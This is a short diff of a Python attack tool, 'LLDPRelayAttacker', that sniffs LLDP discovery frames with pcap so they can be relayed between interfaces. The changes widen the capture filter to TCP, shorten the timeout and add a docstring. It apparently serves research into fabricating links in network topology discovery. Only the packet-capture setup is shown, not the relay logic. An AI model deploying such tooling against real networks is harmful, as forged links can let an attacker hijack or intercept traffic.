@@ -1,25 +1,24 @@
 import time
 import pcap
+import dpkt
+import random
 from optparse import OptionParser
 
-# Notice: any modification packet in immediate node (even if only relay packets) 
-# should turn off the checksum of tx and rx.
-# Command: 
-#   ethtool -K tx off 
-#   ethtool -K rx off
-
 class LLDPRelayAttacker(object):
+    '''
+    bind_iface: the binding interface to sniff LLDP packets.
+    relay_ends: relay the LLDP to the ends through UDP sockets. 
+    '''
     def __init__(self, in_dev, out_dev, fwd_all):
         self._init_pcap(in_dev, out_dev, fwd_all)
 
     def _init_pcap(self, in_dev, out_dev, fwd_all):
-        
-        self.in_handler = pcap.pcap(in_dev, promisc=False, immediate=True, timeout_ms=50)
+        self.in_handler = pcap.pcap(in_dev, promisc=False, immediate=True, timeout_ms=5)
         self.in_handler.setdirection(pcap.PCAP_D_IN)
         if not int(fwd_all):
             filter_strategy = 'ether proto 0x88cc'
         else:
-            filter_strategy = 'ether proto 0x88cc or \
+            filter_strategy = 'tcp or (ether proto 0x88cc) or \
                 (not ether dst host ff:ff:ff:ff:ff:ff and \
                  not ether src host 00:00:de:ad:be:ef)'
         self.in_handler.setfilter(filter_strategy)
